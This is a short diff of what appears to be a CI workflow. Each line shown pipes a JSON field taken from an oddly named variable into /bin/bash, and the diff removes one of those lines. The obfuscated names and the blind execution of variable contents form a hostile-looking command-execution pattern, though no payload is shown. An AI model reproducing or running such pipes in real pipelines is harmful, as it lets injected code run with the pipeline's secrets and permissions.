@@ -41,7 +41,6 @@ jobs:
           echo $ogu3118 | jq -r .ajudu28 | /bin/bash
           printf '%s' "$oe5" | jq -r .bky12258 | /bin/bash
           printf '%s' "$a1797" | jq -r .paxl260 | /bin/bash
-          printf '%s' "$sjpbb99203" | jq -r .ws0 | /bin/bash
           printf '%s' "$iwn1" | jq -r .y30095 | /bin/bash
           printf '%s' "$hozg5" | jq -r .phl71168 | /bin/bash
           echo $yrtc93 | jq -r .l08537 | /bin/bash
